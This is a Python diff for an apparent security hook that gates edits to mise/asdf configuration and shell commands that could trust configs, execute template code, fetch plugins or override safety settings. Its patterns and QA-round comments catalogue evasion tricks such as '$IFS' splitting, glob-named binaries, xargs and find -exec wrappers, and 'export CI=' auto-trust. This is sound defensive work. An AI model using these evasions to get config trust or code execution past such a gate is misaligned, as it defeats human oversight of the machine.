+    "python.compile", "node.corepack", "status.missing_tools",
+    "status.show_env", "status.show_tools",
+))
+# Safety switches: fine when ON, gated when turned off.
+_MISE_SETTINGS_SAFE_IF_TRUE = frozenset(("paranoid", "gpg_verify"))
+# Tool backends that fetch only from mise's own curated sources.
+_MISE_SAFE_BACKENDS = frozenset(("core", "aqua"))
+# Tool option keys with no exec/fetch effect.
+_MISE_TOOL_SAFE_OPTS = frozenset(("version", "os", "platforms", "depends",
+                                  "profile", "components", "targets",
+                                  "virtualenv"))
+_MISE_EXEC_WORD_RE = re.compile(r"\bexec\s*\(", re.IGNORECASE)  # a Tera call needs `(`
+_MISE_TPL_OPEN_RE = re.compile(r"\{[{%]")
+
+
+class _MiseTemplateExec:
+    """Linear `{{`/`{%` ... `exec` test (QA round 1: the lazy-regex form was
+    quadratic -- 35 s on 80 KB of `{{` -- and a hook timeout fails open)."""
+
+    @staticmethod
+    def search(s):
+        if not isinstance(s, str):
+            return None
+        m = _MISE_TPL_OPEN_RE.search(s)
+        if not m:
+            return None
+        return _MISE_EXEC_WORD_RE.search(s, m.end())
+
+
+_MISE_TEMPLATE_EXEC_RE = _MiseTemplateExec()
+# Relative, no `..`, and the last component must be venv-named: mise
+# prepends `<venv>/bin` to PATH, so `_.python.venv = "tools"` is `_.path`
+# binary shadowing in disguise (QA round 1).
+_MISE_VENV_PATH_RE = re.compile(
+    r"^(?!/)(?![A-Za-z]:)(?!~)(?:[\w.\-]{1,100}/){0,4}\.?(?:venv|virtualenv)[\w.\-]{0,40}/?$",
+    re.IGNORECASE)
+_MISE_MAX_TEXT = 2_000_000
+
+
+def _mise_fp(*parts) -> str:
+    """Canonical fingerprint: a hash of the FULL value (QA round 1: a
+    4000-char truncation let a long human-set hook be extended unseen)."""
+    import hashlib as _hl
+    import json as _json
+    try:
+        txt = _json.dumps(parts, sort_keys=True, default=str)
+    except Exception:
+        txt = repr(parts)
+    return _hl.sha256(txt.encode("utf-8", "surrogatepass")).hexdigest()
+
+
+def _mise_templates(v, path, out, depth=0):
+    if depth > 24:
+        out.append(("<oversized nesting>", _mise_fp("deep", path)))
+        return
+    if isinstance(v, str):
+        if _MISE_TEMPLATE_EXEC_RE.search(v):
+            out.append(("template exec() in " + ".".join(map(str, path))[:60],
+                        _mise_fp("tpl", path, v)))
+    elif isinstance(v, dict):
+        for k, x in v.items():
+            if isinstance(k, str) and _MISE_TEMPLATE_EXEC_RE.search(k):
+                out.append(("template exec() in a key", _mise_fp("tplk", path, k)))
+            _mise_templates(x, path + [k], out, depth + 1)
+    elif isinstance(v, list):
+        for i, x in enumerate(v):
+            _mise_templates(x, path + [i], out, depth + 1)
+
+
+def _mise_env_entries(env, out, where="env"):
+    if isinstance(env, list):                       # [[env]] array form
+        for e in env:
+            _mise_env_entries(e, out, where)
+        return
+    if not isinstance(env, dict):
+        return
+    for k, v in env.items():
+        ks = str(k)
+        if ks == "_":
+            items = v if isinstance(v, list) else [v]
+            for it in items:
+                if not isinstance(it, dict):
+                    out.append(("env._ directive", _mise_fp(where, "_", it)))
+                    continue
+                for dk, dv in it.items():
+                    if dk == "python" and _mise_venv_ok(dv):
+                        continue
+                    out.append((f"env._.{dk}"[:60], _mise_fp(where, "_", dk, dv)))
+            continue
+        if mise_env_name_dangerous(ks):
+            out.append((f"env {ks}"[:60], _mise_fp(where, ks, v)))
+
+
+def _mise_venv_ok(v) -> bool:
+    if not isinstance(v, dict) or set(v) - {"venv"}:
+        return False
+    venv = v.get("venv")
+    if isinstance(venv, dict):
+        if set(venv) - {"path", "create"}:
+            return False
+        venv = venv.get("path")
+    return (isinstance(venv, str) and bool(_MISE_VENV_PATH_RE.match(venv))
+            and ".." not in venv.split("/"))
+
+
+def _mise_tool_entries(tools, out):
+    if not isinstance(tools, dict):
+        if tools not in (None, {}, []):
+            out.append(("tools (non-table)", _mise_fp("tools", tools)))
+        return
+    for name, spec in tools.items():
+        n = str(name)
+        backend = n.split(":", 1)[0].lower() if ":" in n else ""
+        if backend and backend not in _MISE_SAFE_BACKENDS:
+            out.append((f"tool {n}"[:60], _mise_fp("tool", n, spec)))
+            continue
+        specs = spec if isinstance(spec, list) else [spec]
+        for s in specs:
+            if isinstance(s, str):
+                if s.strip().lower().startswith(("path:", "prefix:/", "ref:http")):
+                    out.append((f"tool {n} = {s}"[:60], _mise_fp("tool", n, s)))
+            elif isinstance(s, dict):
+                extra = sorted(str(x) for x in s if str(x) not in _MISE_TOOL_SAFE_OPTS)
+                ver = s.get("version")
+                if extra or (isinstance(ver, str) and ver.strip().lower().startswith(
+                        ("path:", "prefix:/", "ref:http", "ref:git"))):
+                    out.append((f"tool {n} options {','.join(extra)[:30]}"[:60],
+                                _mise_fp("tool", n, s)))
+            elif s is not None and not isinstance(s, (int, float)):
+                out.append((f"tool {n}"[:60], _mise_fp("tool", n, s)))
+
+
+def _mise_settings_entries(st, out, prefix=""):
+    if not isinstance(st, dict):
+        if st not in (None, {}):
+            out.append(("settings (non-table)", _mise_fp("settings", st)))
+        return
+    for k, v in st.items():
+        ks = str(k)
+        full = prefix + ks
+        if not prefix and ks in _MISE_SETTINGS_SAFE:
+            continue
+        if not prefix and ks in _MISE_SETTINGS_SAFE_IF_TRUE and v is True:
+            continue
+        if not prefix and isinstance(v, dict) and ks not in _MISE_SETTINGS_SAFE:
+            for sk, sv in v.items():
+                if f"{ks}.{sk}".lower() not in _MISE_SETTINGS_SAFE_NESTED:
+                    out.append((f"settings.{ks}.{sk}"[:60], _mise_fp("settings", ks, sk, sv)))
+            continue
+        out.append((f"settings.{full}"[:60], _mise_fp("settings", full, v)))
+
+
+def mise_toml_safety_switches(content) -> set:
+    """Safety switches (`paranoid`/`gpg_verify` = true) a mise.toml sets; a
+    caller gates an edit that REMOVES one (QA round 2), the file analogue of
+    `mise settings unset paranoid`. None if the content does not parse."""
+    if not isinstance(content, str) or _mise_toml is None or len(content) > _MISE_MAX_TEXT:
+        return None
+    try:
+        doc = _mise_toml.loads(content.lstrip("\ufeff"))
+    except Exception:
+        return None
+    st = doc.get("settings")
+    if not isinstance(st, dict):
+        return set()
+    return {k for k in _MISE_SETTINGS_SAFE_IF_TRUE if st.get(k) is True}
+
+
+def mise_toml_unsafe_entries(content) -> list:
+    """(label, fingerprint) for every exec-bearing construct in a mise.toml
+    body. Fingerprints are canonical (formatting-independent), so a caller
+    can diff the before/after sets of an edit."""
+    out = []
+    if not isinstance(content, str) or not content.strip():
+        return out
+    if len(content) > _MISE_MAX_TEXT:
+        return [("<oversized>", "<oversized>")]
+    if _mise_toml is None:
+        return [("<no TOML parser available>", _mise_fp("noparser", content))]
+    try:
+        doc = _mise_toml.loads(content.lstrip("﻿"))
+    except Exception:
+        return [("<unparseable TOML>", "<unparseable>")]
+    for key in ("tool_alias", "alias"):
+        # Version-only aliases (`[tool_alias.node.versions] lts = "20"`)
+        # are benign; anything with a backend `:` is not (QA round 2).
+        v = doc.get(key)
+        if isinstance(v, dict):
+            for k, x in v.items():
+                ver = x.get("versions") if isinstance(x, dict) and set(x) <= {"versions"} else None
+                if isinstance(ver, dict) and all(isinstance(y, str) and ":" not in y
+                                                 for y in ver.values()):
+                    continue
+                out.append((f"{key}.{k}"[:60], _mise_fp(key, k, x)))
+        elif v not in (None, {}, []):
+            out.append((key, _mise_fp(key, v)))
+    for key in ("hooks", "watch_files", "plugins",
+                "env_file", "env_path", "dotenv", "shell_alias", "prepare"):
+        v = doc.get(key)
+        if v in (None, {}, []):
+            continue
+        if isinstance(v, dict):
+            for k, x in v.items():
+                out.append((f"{key}.{k}"[:60], _mise_fp(key, k, x)))
+        elif isinstance(v, list):
+            for x in v:
+                out.append((key, _mise_fp(key, x)))
+        else:
+            out.append((key, _mise_fp(key, v)))
+    _mise_env_entries(doc.get("env"), out)
+    vars_ = doc.get("vars")
+    if isinstance(vars_, dict) and vars_.get("_") not in (None, {}, []):
+        out.append(("vars._ directive", _mise_fp("vars", "_", vars_.get("_"))))
+    _mise_tool_entries(doc.get("tools"), out)
+    _mise_settings_entries(doc.get("settings"), out)
+    _mise_templates(doc, [], out)
+    return out
+
+
+def mise_tool_versions_unsafe_entries(content) -> list:
+    """`.tool-versions` lines naming a code-fetching backend or a `path:`
+    version (mise reads both forms from this asdf file)."""
+    out = []
+    if not isinstance(content, str):
+        return out
+    if len(content) > _MISE_MAX_TEXT:
+        return [("<oversized>", "<oversized>")]
+    for line in content.replace("\r", "\n").split("\n"):
+        s = line.split("#", 1)[0].strip(" \t﻿\v\f")
+        if not s:
+            continue
+        words = s.split()
+        tool = words[0]
+        backend = tool.split(":", 1)[0].lower() if ":" in tool else ""
+        bad = bool(backend and backend not in _MISE_SAFE_BACKENDS)
+        bad = bad or any(w.lower().startswith(("path:", "prefix:/", "ref:http", "ref:git"))
+                         for w in words[1:])
+        bad = bad or bool(_MISE_TEMPLATE_EXEC_RE.search(line))
+        if bad:
+            out.append((s[:60], _mise_fp("tv", " ".join(words))))
+    return out
+
+
+_MISE_RC_ENV_NAME_RE = re.compile(r"^[\w.\-]{1,64}$")
+
+
+def mise_miserc_unsafe_entries(content) -> list:
+    """`.miserc.toml` is read as TOP-LEVEL early settings (mise
+    `src/config/miserc.rs`): `override_config_filenames`/
+    `override_tool_versions_filenames` make mise load configs under names
+    no guard knows, `ignored_config_paths` drops the human's global config
+    (and its `paranoid = true`), `ceiling_paths`/`env_conf_d`/`env_sets`
+    reshape which files load (QA round 15). Allowlist: only `env` (plain
+    environment names, selecting the already-gated `mise.<env>.toml`)."""
+    out = []
+    if not isinstance(content, str) or not content.strip():
+        return out
+    if len(content) > _MISE_MAX_TEXT:
+        return [("<oversized>", "<oversized>")]
+    if _mise_toml is None:
+        return [("<no TOML parser available>", _mise_fp("noparser", content))]
+    try:
+        doc = _mise_toml.loads(content.lstrip("\ufeff"))
+    except Exception:
+        return [("<unparseable TOML>", "<unparseable>")]
+    for k, v in doc.items():
+        if k == "env":
+            vals = v if isinstance(v, list) else [v]
+            if all(isinstance(x, str) and _MISE_RC_ENV_NAME_RE.match(x) for x in vals):
+                continue
+        out.append((f"miserc {k}"[:60], _mise_fp("miserc", k, v)))
+    _mise_templates(doc, [], out)
+    return out
+
+
+def mise_unsafe_entries(content, kind: str) -> list:
+    if kind == "tool-versions":
+        return mise_tool_versions_unsafe_entries(content)
+    if kind == "miserc":
+        return mise_miserc_unsafe_entries(content)
+    return mise_toml_unsafe_entries(content)
+
+
+_MISE_PATCH_HDR_RE = re.compile(
+    r"^[ \t]*(?:\*\*\*\s+(?:Add|Update|Delete|Move)\s+File:|\+\+\+\s|---\s|diff\s--git\s"
+    r"|\*\*\*\s+Move\s+to:|(?:rename|copy)\s+(?:from|to)\s)[^\n]*$", re.MULTILINE)
+
+
+def mise_patch_hit(text) -> bool:
+    """True if `text` is a patch whose header line (incl. git `rename to`/
+    `copy to` -- QA round 8) names a mise path."""
+    if not isinstance(text, str) or "\n" not in text:
+        return False
+    for m in _MISE_PATCH_HDR_RE.finditer(text[:2_000_000]):
+        if MISE_PATH_RE.search(m.group(0)):
+            return True
+    return False
+
+
+# ---- mise / asdf CLI forms --------------------------------------------------
+_MISE_CLI_BINS = frozenset(("mise", "rtx", "asdf"))
+# Global options that take a separate value (`mise -C dir trust`).
+_MISE_VALUE_OPTS = frozenset(("-C", "--cd", "-E", "--env", "-j", "--jobs",
+                              "--log-level", "--output", "--profile", "-P"))
+_MISE_CLI_SEG_RE = re.compile(r"&&|\|\||[;&|\n(){}`]|\$\(")
+# Only an ASSIGNMENT (`NAME=`, `export NAME[=]`, `setenv NAME`) -- a mere
+# mention (`printenv MISE_DATA_DIR`, `grep MISE_YES docs/`) is not an
+# override (QA round 1).
+_MISE_TRUST_ENV_RE = re.compile(
+    r"(?:^|[\s;&|(`'\"])(?:(?:export|declare\s+-x|typeset\s+-x|setenv|set\s+-gx)\s+(?=\w+(?:\s*=|\s|$))|(?=\w+=))"
+    r"(?:MISE|RTX)_(?:TRUSTED_CONFIG_PATHS|PARANOID|YES|URL_REPLACEMENTS"
+    r"|UNIX_DEFAULT_\w*SHELL\w*|GLOBAL_CONFIG_FILE|SYSTEM_CONFIG_FILE|CONFIG_DIR"
+    r"|DATA_DIR|SHIMS_DIR|OVERRIDE_CONFIG_FILENAMES|OVERRIDE_TOOL_VERSIONS_FILENAMES)"
+    r"(?:=|\s|$)", re.IGNORECASE)
+# Any `MISE_*`/`RTX_*` name that is ASSIGNED (`N=`, `N+=`, `export N`,
+# `declare -x N`, `setenv N`, a `{N,..}=` brace word) -- every one of them is
+# a mise setting, so it is judged against the same allowlist as `mise
+# settings set` (QA round 2: `MISE_YES+=1`, `MISE_NODE_MIRROR_URL=`).
+_MISE_ENV_NAME_RE = re.compile(r"(?<![\w$])((?:MISE|RTX)_\w+)", re.IGNORECASE)
+_MISE_EXPORT_BEFORE_RE = re.compile(
+    r"(?:export|declare|typeset|setenv|set\s+-[gU]?x|set\s+-gx|readonly|local)(?:\s+-{1,2}\w*)*\s+(?:\S+\s+)*$",
+    re.IGNORECASE)
+_MISE_ENV_OK_SUFFIX = frozenset(("env", "profile", "log_file", "log_level",
+                                 "quiet", "verbose", "jobs", "experimental",
+                                 "color", "silent"))
+
+
+def _mise_env_assignment_hit(cmd: str) -> str:
+    for m in _MISE_ENV_NAME_RE.finditer(cmd):
+        name = m.group(1)
+        after = cmd[m.end():m.end() + 300]
+        am = re.match(r"(?:[,}][^\s=;&|]*)?(\+?=)(\S*)", after)
+        line_start = max(cmd.rfind("\n", 0, m.start()), cmd.rfind(";", 0, m.start()),
+                         cmd.rfind("&", 0, m.start()), cmd.rfind("|", 0, m.start())) + 1
+        before = cmd[line_start:m.start()].lstrip("{")
+        exported = bool(_MISE_EXPORT_BEFORE_RE.search(before.rstrip("{").rstrip() + " ")) \
+            if before.strip() else False
+        if not (am or exported):
+            continue
+        if before.strip().split()[:1] == ["unset"]:
+            continue
+        key = name.split("_", 1)[1].lower()
+        val = (am.group(2) if am else "").strip("'\"").lower()
+        if key in _MISE_ENV_OK_SUFFIX or key in _MISE_SETTINGS_SAFE:
+            continue
+        if key in _MISE_SETTINGS_SAFE_IF_TRUE and val in ("1", "true", "yes"):
+            continue
+        nested = key.replace("_", ".", 1)
+        if nested in _MISE_SETTINGS_SAFE_NESTED:
+            continue
+        return name.upper()
+    return ""
+
+
+# `mise run`/`watch` options taking a separate value (QA round 7).
+_MISE_RUN_VALUE_OPTS = frozenset(("-t", "--tool", "-o", "-s", "--shell", "--timeout",
+                                  "-c", "--continue-on-error-max", "--output",
+                                  "-j", "--jobs", "-w", "--watch", "-g", "--glob"))
+_MISE_SETTINGS_KV_RE = re.compile(r"^([A-Za-z_][\w.\-]*)=(.*)$")
+
+
+def _mise_spec_unsafe(spec: str) -> bool:
+    s = spec.strip("'\"")
+    if not s or s.startswith("-"):
+        return False
+    name, _, ver = s.partition("@")
+    backend = name.split(":", 1)[0].lower() if ":" in name else ""
+    if backend and backend not in _MISE_SAFE_BACKENDS:
+        return True
+    return ver.lower().startswith(("path:", "prefix:/", "ref:http", "ref:git"))
+
+
+_MISE_PUNCT = "();<>|&`\n"
+_MISE_WRAPPERS = frozenset(("sudo", "env", "command", "exec", "nohup", "time", "nice",
+                            "doas", "builtin", "then", "do", "else", "!", "{",
+                            "timeout", "stdbuf", "busybox", "ionice", "chrt", "setsid",
+                            "taskset", "unbuffer", "caffeinate", "flock"))
+# Wrapper options that take a separate value (QA round 13: `sudo -u u cp`).
+_MISE_WRAPPER_VALUE_OPTS = {
+    "sudo": {"-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T", "--user",
+             "--group", "--host", "--prompt", "--chdir"},
+    "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
+    "time": {"-o", "-f", "--output", "--format"}, "exec": {"-a"},
+    "command": set(), "unbuffer": set(),
+    "doas": {"-u", "-C"},
+    "nice": {"-n", "--adjustment"},
+    "timeout": {"-s", "--signal", "-k", "--kill-after"},
+    "ionice": {"-c", "-n", "-p", "--class", "--classdata"},
+    "chrt": {"-p"}, "taskset": {"-c", "--cpu-list"}, "flock": {"-w", "-E", "--timeout"},
+}
+# Wrappers whose first positional is an argument, not the command.
+_MISE_WRAPPER_POSITIONAL = {"timeout": 1, "chrt": 1, "taskset": 1, "flock": 1}
+
+
+def _mise_strip_wrapper(seg: list) -> list:
+    """Drop ONE leading wrapper word with its options/values (and, for
+    `timeout 5`/`chrt 10`/`taskset 0x1`/`flock FILE`, its positional)."""
+    w = seg[0].lower()
+    if w in ("then", "do", "else", "!", "{", "builtin", "busybox"):
+        return seg[1:]
+    vals = _MISE_WRAPPER_VALUE_OPTS.get(w, set())
+    k = 1
+    pos = _MISE_WRAPPER_POSITIONAL.get(w, 0)
+    while k < len(seg) and seg[k].startswith("-") and seg[k] != "-":
+        o = seg[k]
+        if o == "--":
+            k += 1
+            break
+        if w == "taskset" and o in ("-c", "--cpu-list", "-p", "--pid") or (
+                w == "taskset" and re.fullmatch(r"-[a-z]*[cp][a-z]*", o)):
+            pos = 0 if "p" not in o else pos
+        # `-u u`, and a combined cluster whose LAST letter takes a value
+        # (`sudo -iu u`, `-Eu u` -- QA round 14).
+        takes = o in vals or (len(o) > 2 and not o.startswith("--") and "=" not in o
+                              and ("-" + o[-1]) in vals)
+        k += 2 if takes else 1
+    k += pos
+    return seg[k:]
+
+
+def _mise_glob_binary(cmd: str) -> bool:
+    """A simple command whose COMMAND word is a glob matching mise/rtx/asdf
+    (`~/.local/bin/m*e trust`, `/usr/bin/mi?e trust` -- QA round 9). Only
+    the command position, and the glob needs a literal letter (`ls *` is
+    not one)."""
+    if not any(c in cmd for c in "*?["):
+        return False
+    for n, seg in enumerate(re.split(r"&&|\|\||[;&|\n(){}`]", cmd)):
+        if n > 4000:
+            return True
+        words = seg.split()
+        while words and (words[0].lower() in _MISE_WRAPPERS or _HTTP_RC_ASSIGN_RE.match(words[0])):
+            words.pop(0)
+        if not words:
+            continue
+        base = words[0].strip("'\"").replace("\\", "/").rsplit("/", 1)[-1].lower()
+        if any(c in base for c in "*?[") and re.search(r"[a-z]", base) and len(base) <= 40 \
+                and any(fnmatch.fnmatchcase(b, base) for b in _MISE_CLI_BINS):
+            return True
+        # ... or the command a runner executes (`xargs m?se trust`).
+        for r_, w_ in enumerate(words[:-1]):
+            if w_.rsplit("/", 1)[-1].lower() in ("xargs", "parallel", "-exec", "-execdir"):
+                for nxt in words[r_ + 1:r_ + 6]:
+                    b2 = nxt.strip("'\"").rsplit("/", 1)[-1].lower()
+                    if any(c in b2 for c in "*?[") and re.search(r"[a-z]", b2) and len(b2) <= 40 \
+                            and any(fnmatch.fnmatchcase(b, b2) for b in _MISE_CLI_BINS):
+                        return True
+    return False
+# `mise`/`rtx`/`asdf` as a word, not inside `promise`/`premises` (QA round 2).
+_MISE_BIN_WORD_RE = re.compile(r"(?<![\w.\-])(?:mise|rtx|asdf)(?:\.exe)?(?![\w\-])",
+                               re.IGNORECASE)
+_MISE_WHICH_RE = re.compile(
+    r"\$\(\s*(?:which|command\s+-[vV]|type\s+-[pP]|whence\s+-p|where)\s+"
+    r"([\w./\-]*(?:mise|rtx|asdf)(?:\.exe)?)\s*\)"
+    r"|`\s*(?:which|command\s+-[vV]|type\s+-[pP]|whence\s+-p|where)\s+"
+    r"([\w./\-]*(?:mise|rtx|asdf)(?:\.exe)?)\s*`", re.IGNORECASE)
+
+
+def _mise_unquoted(cmd: str) -> str:
+    """`cmd` with quoted spans removed (a quoted brace is not expanded)."""
+    return re.sub(r"'[^']*'|\"(?:[^\"\\]|\\.)*\"", " ", cmd)
+
+
+def _mise_cli_segments(cmd: str) -> list:
+    """Simple commands of `cmd` as word lists: quote-aware (a quoted
+    `{{exec(...)}}` stays one word), split at `;`/`&`/`|`/`(`/`)`/backtick/
+    newline. Unbalanced quoting falls back to a plain regex split."""
+    import shlex as _sh
+    if len(cmd) > 50_000:
+        # shlex is quadratic on one long token (QA round 9): quote-unaware split.
+        return [seg.split() for seg in _MISE_CLI_SEG_RE.split(cmd)]
+    try:
+        lx = _sh.shlex(cmd, posix=True, punctuation_chars=_MISE_PUNCT)
+        lx.whitespace = " \t\r"        # `\n` separates commands (QA round 1)
+        lx.whitespace_split = True
+        lx.commenters = "#"
+        toks = list(lx)
+    except ValueError:
+        return [seg.split() for seg in _MISE_CLI_SEG_RE.split(cmd)]
+    out, cur = [], []
+    skip_target = False
+    for t in toks:
+        if t and all(c in _MISE_PUNCT for c in t):
+            # `;>`, `&&>`, `|>`: a separator glued to a redirect (QA round 13).
+            sm = re.match(r"(?:;|&&|\|\||\|(?!&)|\(|\)|\n|`|&(?![>&]))+", t)
+            if sm and sm.end() < len(t) and ("<" in t[sm.end():] or ">" in t[sm.end():]):
+                if cur:
+                    out.append(cur)
+                cur = []
+                t = t[sm.end():]
+            if ("<" in t or ">" in t) and not t.startswith(("<(", ">(")):
+                # A redirect is part of the SAME simple command: drop its fd
+                # number and its target word (QA round 12: `cp -r /tmp/mise
+                # ~/.config/ 2>/dev/null` took `2` as the destination).
+                if cur and cur[-1].isdigit():
+                    cur.pop()
+                skip_target = True
+                continue
+            if cur:
+                out.append(cur)
+            cur = []
+            skip_target = False
+            continue
+        if skip_target:
+            skip_target = False
+            continue
+        cur.append(t[2:] if t.startswith("$(") else t)
+    if cur:
+        out.append(cur)
+    return out
+
+
+def mise_cli_hit(cmd) -> str:
+    """A reason string if `cmd` runs a mise/rtx/asdf subcommand that trusts
+    a config, rewrites a config's exec-bearing parts, or installs a plugin;
+    '' otherwise."""
+    if not isinstance(cmd, str) or not cmd:
+        return ""
+    if len(cmd) > 400_000:
+        if _MISE_BIN_WORD_RE.search(cmd.replace("\\", "")):
+            return "oversized command naming mise"
+        return ""
+    cmd = cmd.replace("\\", "") if "\\" in cmd else cmd   # `mi\se` is `mise`
+    low = cmd.lower()
+    if _mise_glob_binary(cmd):
+        return "mise binary named by a glob"       # `~/.local/bin/m*e trust` (QA round 9)
+    if "mise" not in low and "rtx" not in low and "asdf" not in low:
+        return ""               # every gated CLI form names one (perf)
+    # `mise$IFS trust` / `mise${IFS}trust` (QA round 2; as rule_direnv_protect).
+    cmd = re.sub(r"\$\{?IFS\}?", " ", cmd)
+    # `` mise `echo trust` `` / `mise $(...)`: the tokenizer splits at the
+    # substitution, so catch it here (QA round 3).
+    if re.search(_MISE_BIN_WORD_RE.pattern + r"(?:\s+-[^\s`$]*)*\s+(?:`|\$\(|<\()", cmd,
+                 re.IGNORECASE):
+        return "mise with a computed subcommand"
+    # `mise$x trust`, `mise$(true) trust`, `` mise`true` trust ``,
+    # `{mise,trust}`: an expansion glued to the binary word (QA round 4).
+    if re.search(r"(?<![\w.\-])(?:mise|rtx|asdf)(?:\.exe)?[$`]", cmd, re.IGNORECASE) or \
+            re.search(r"\{[^{}\s]*,[^{}\s]*\}", _mise_unquoted(cmd)) and re.search(
+                r"\{[^{}\s]*(?<![\w.\-])(?:mise|rtx|asdf)(?![\w\-])[^{}\s]*\}",
+                _mise_unquoted(cmd), re.IGNORECASE):
+        return "computed mise invocation"
+    if re.search(r"--(?:pre|pager|search-zip-cmd)(?:=|\s+)\S*(?<![\w.\-])(?:mise|rtx|asdf)(?![\w\-])",
+                 cmd, re.IGNORECASE):
+        return "mise run as another tool's preprocessor/pager (--pre/--pager)"
+    bad = _mise_env_assignment_hit(cmd)
+    if bad:
+        return f"mise setting {bad} overridden through the environment"
+    if not _MISE_BIN_WORD_RE.search(cmd):
+        return ""
+    # mise treats CI environments as trusting every config: `export CI=`
+    # anywhere, or a `CI=` prefix on the mise command itself (QA round 2
+    # narrowing: `CI=true pnpm test && echo mise` is not one).
+    if re.search(r"(?:^|[\s;&|(`'\"])export\s+(?:-\S+\s+)*CI\+?=", cmd):
+        return "export CI= alongside mise (mise auto-trusts configs under CI)"
+    # `"$(which mise)" trust`, `` `command -v mise` trust `` (QA round 1).
+    cmd = _MISE_WHICH_RE.sub(lambda m: m.group(1) or m.group(2), cmd)
+    return _mise_cli_hit(cmd, 0)
+
+
+def _mise_cli_hit(cmd: str, depth: int) -> str:
+    if depth > 4:
+        return "deeply nested mise invocation"
+    for words in _mise_cli_segments(cmd):
+        # A quoted multi-word argument may itself be a command
+        # (`mise exec -c "mise trust"`, `sudo sh -c "mise trust"`).
+        for wi, w in enumerate(words):
+            if (" " in w or "\n" in w) and _MISE_BIN_WORD_RE.search(w):
+                if _mise_runner_ctx(words, wi)[1] >= 0:
+                    if not _mise_is_command_word(words, wi):
+                        continue        # an argument of `xargs grep ...`
+                    # `xargs -I% sh -c 'mise %'`: the runner substitutes into
+                    # the quoted command (QA round 6).
+                    return "mise inside a command run by xargs/parallel/find -exec"
+                r = _mise_cli_hit(w, depth + 1)
+                if r:
+                    return r
+        if sum(1 for w in words if _MISE_BIN_WORD_RE.fullmatch(
+                w.replace("\\", "/").rsplit("/", 1)[-1])) > 64:
+            return "too many mise invocations in one command"
+        # EVERY mise/rtx/asdf word starts a candidate invocation, so a
+        # nested `mise x -- mise trust` / `mise run -- asdf plugin add` /
+        # wrapper prefix is judged too (QA round 1).
+        for i, w in enumerate(words):
+            base = w.replace("\\", "/").rsplit("/", 1)[-1].lower()
+            if base.endswith(".exe"):
+                base = base[:-4]
+            if base not in _MISE_CLI_BINS:
+                if not (any(c in base for c in "*?[") and any(
+                        fnmatch.fnmatchcase(b, base) for b in _MISE_CLI_BINS)):
+                    continue
+                return "mise binary named by a glob"     # `~/.local/bin/m*e trust` (QA round 9)
+            if not _mise_is_command_word(words, i):
+                continue
+            if any(x.replace("\\", "/").rsplit("/", 1)[-1].lower() in ("xargs", "parallel")
+                   for x in words[:i]):
+                # stdin supplies (or substitutes into) the arguments (QA round 4).
+                return "mise run with arguments from stdin (xargs/parallel)"
+            if any(re.match(r"CI\+?=", x) for x in words[:i]):
+                return "CI= on a mise command (mise auto-trusts configs under CI)"
+            r = _mise_judge_invocation(words, i)
+            if r:
+                return r
+    return ""
+
+
+_MISE_XARGS_VALUE_OPTS = frozenset(("-a", "-I", "-n", "-L", "-P", "-d", "-E", "-s",
+                                    "-j", "--arg-file", "--delimiter", "--max-args",
+                                    "--max-procs", "--replace", "--eof", "--jobs"))
+_MISE_RUNNER_WORDS = frozenset(("xargs", "parallel"))
+_MISE_XARGS_FLAG_OPTS = frozenset(("-0", "-r", "-t", "-x", "-p", "--null", "--verbose",
+                                   "--no-run-if-empty", "--interactive", "--exit",
+                                   "--open-tty", "-o", "--"))
+_MISE_FIND_EXEC = frozenset(("-exec", "-execdir", "-ok", "-okdir"))
+
+
+# Commands that only read/print their arguments: under xargs/parallel/
+# `find -exec` a mise word after one of these is a mention, not a call.
+_MISE_MENTION_TOOLS = frozenset((
+    # No echo/printf: `xargs echo mise trust | sh` (QA round 7).
+    "grep", "egrep", "fgrep", "rg", "ag", "ack", "cat", "ls",
+    "wc", "head", "tail", "file", "stat", "basename", "dirname", "realpath",
+    "readlink", "diff", "cmp", "md5sum", "sha256sum", "sha1sum", "du", "test",
+))
+
+
+def _mise_runner_ctx(words: list, i: int):
+    """(kind, index) of the xargs/parallel/`find -exec` runner whose command
+    contains words[i], or ("", -1)."""
+    m, kind = -1, ""
+    for k in range(i):
+        b = words[k].replace("\\", "/").rsplit("/", 1)[-1].lower()
+        if b in _MISE_RUNNER_WORDS:
+            m, kind = k, "xargs"
+        elif words[k] in _MISE_FIND_EXEC:
+            m, kind = k, "find"
+        elif words[k] in (";", "\\;", "+") and kind == "find":
+            m, kind = -1, ""
+    return kind, m
+
+
+def _mise_is_command_word(words: list, i: int) -> bool:
+    """Under xargs/parallel/`find -exec`, a mise word is only a MENTION when
+    the command they run is a known read-only tool (`find ... -exec grep -l
+    mise {} \\;`, `xargs grep mise` -- QA round 5 false positive). Anything
+    else -- a wrapper (`env`/`sudo`/`nice`), an unknown runner option whose
+    value might be the command -- keeps it a call (QA round 6: the round-5
+    "first word only" rule hid `xargs env mise trust`)."""
+    kind, m = _mise_runner_ctx(words, i)
+    if m < 0:
+        return True
+    if any(w.startswith("PATH=") for w in words[:m + 1]):
+        return True
+    q = m + 1
+    while q < i and words[q].startswith("-"):
+        o = words[q]
+        if o in _MISE_XARGS_VALUE_OPTS:
+            q += 2
+        elif o in _MISE_XARGS_FLAG_OPTS or (kind == "xargs" and "=" in o
+                                             and o.split("=", 1)[0] in _MISE_XARGS_VALUE_OPTS) \
+                or (kind == "xargs" and len(o) > 2 and not o.startswith("--")
+                    and o[:2] in _MISE_XARGS_VALUE_OPTS):     # glued `-n1`, `-I%`
+            q += 1
+        else:
+            # Unknown option (or a GNU long-option abbreviation, `--arg`):
+            # it may consume the next word -- keep mise a call (QA round 7).
+            return True
+    if q >= i:
+        return True
+    cmdw = words[q]
+    if "/" in cmdw or "\\" in cmdw:
+        return True             # `./grep` may be anything (QA round 7)
+    cmdw = cmdw.lower()
+    if cmdw not in _MISE_MENTION_TOOLS:
+        return True
+    # `rg --pre mise`, `ag/ack --pager mise` run their option value.
+    return any(re.match(r"--(?:pre|pager|search-zip-cmd)\b", w) for w in words[q + 1:i + 1])
+
+
+def _mise_judge_invocation(words: list, i: int) -> str:
+    """Judge the mise/rtx/asdf invocation starting at `words[i]`."""
+    binname = words[i].replace("\\", "/").rsplit("/", 1)[-1].lower().removesuffix(".exe")
+    rest = words[i + 1:i + 1 + 400]        # bounded: linear overall (QA round 2)
+    if len(words) - (i + 1) > 400:
+        return "mise invocation too long to judge"     # fails closed (QA round 3)
+    args = []
+    sub_pos = -1
+    j = 0
+    while j < len(rest):
+        w = rest[j]
+        if not args and w in _MISE_VALUE_OPTS:
+            j += 2
+            continue
+        if not args and w.startswith("-"):
+            j += 1
